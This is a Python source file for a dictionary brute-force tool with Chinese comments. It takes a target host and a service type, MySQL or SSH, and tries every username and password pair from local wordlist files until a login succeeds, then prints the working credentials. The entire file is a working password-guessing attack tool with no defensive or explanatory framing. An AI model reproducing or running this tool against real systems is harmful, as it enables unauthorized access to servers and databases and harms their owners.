import os
import sys
import paramiko
import argparse
import mysql.connector

class BpService:
    def __init__(self) -> None:
        self.position = os.path.dirname(__file__)
        self.param_parse()

    def param_parse(self):
        """对命令行参数进行解析"""
        # create a parser
        parser = argparse.ArgumentParser(
            epilog='\tExample: \r\npython ' + sys.argv[0] + 
            " [-u root] [-p root] 127.0.0.1 mysql"
        )
        # append params
        parser.add_argument("-u", "--user")
        parser.add_argument("-p", "--passwd") 
        parser.add_argument("--port") 
        parser.add_argument("host") 
        parser.add_argument("service", type=str)
        # parse params
        self.args = parser.parse_args()

    def attack(self, host=None, type=None, **kwargs):
        """启动函数, 支持命令行传参, 同时我保留了函数形参, 方便批量执行吧, 就先不加读文件来批量执行的参数了
        :param user: (optional) 指定用户名
        :param passwd: (optional) 指定密码
        :param port: (optional) Port of the corresponding service
        :param database: (optional) MySQL's database to be connected 
        """
        host, type = self.args.host, self.args.service
        if self.args.port:
            kwargs["port"] = self.args.port

        user_file = "{}/db/user.txt".format(self.position)
        pass_file = "{}/db/passwd.txt".format(self.position)

        # case 1: 指定用户名, 爆破密码
        if self.args.user:  
            users = [self.args.user, ]
            with open(pass_file, 'r') as f_pass:
                passwds = f_pass.readlines()
                
            self.try_connect(users, passwds, host, type)
        # case 2: 指定密码, 爆破用户名
        elif self.args.passwd:
            passwds = [self.args.passwd, ]
            with open(user_file, 'r') as f_user:
                users = f_user.readlines()
            
            self.try_connect(users, passwds, host, type)
        # case 3: 使用用户名和密码字典跑
        else:
            with open(pass_file, 'r') as f_pass:
                passwds = f_pass.readlines()
            with open(user_file, 'r') as f_user:
                users = f_user.readlines()
            
            self.try_connect(users, passwds, host, type, **kwargs)

    def try_connect(self, users, passwds, host, type, **kwargs):
        if type == "mysql":
            for passwd in passwds:
                for user in users:
                    self.mysql_connect_try(user, passwd, host, **kwargs)
        elif type == "ssh":
            for passwd in passwds:
                for user in users:
                    self.ssh_connect_try(user, passwd, host, **kwargs)
        else:
            print("请指定需要爆破的服务类型")
            sys.exit()

    def mysql_connect_try(self, user, passwd, host, **kwargs):
        """ try to connect to MySql, if the connection is successful, print the user and password"""
        
        port = 3306
        if "port" in kwargs:
            port = kwargs.get("port")
        db = kwargs.get("database")
        try:
            cnn = mysql.connector.connect(
                user=user.strip(), 
                password=passwd.strip(), 
                host=host,
                database=db, 
                port=port,
            )
            self.result_print(user, passwd)
            cnn.close()
        except mysql.connector.Error as err:
            pass

    def ssh_connect_try(self, user, passwd, host, **kwargs):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        port = 22
        if "port" in kwargs:
            port = kwargs.get("port")
        
        try:
            ssh_client.connect(
                hostname = host, 
                username = user.strip(), 
                password = passwd.strip(),
                port=port,
            )
            self.result_print(user, passwd)
            ssh_client.close()
        except Exception as e:
            # print(f'Failed with error message: {e}')
            pass

    def result_print(self, user, passwd):
        if os.name == "nt":  # 针对于 windows 系统的处理
            os.system("")
        print(f'\033[1;32m连接成功! {user}: {passwd}\033[0m')

if __name__ == '__main__':
    bp = BpService()
    bp.attack()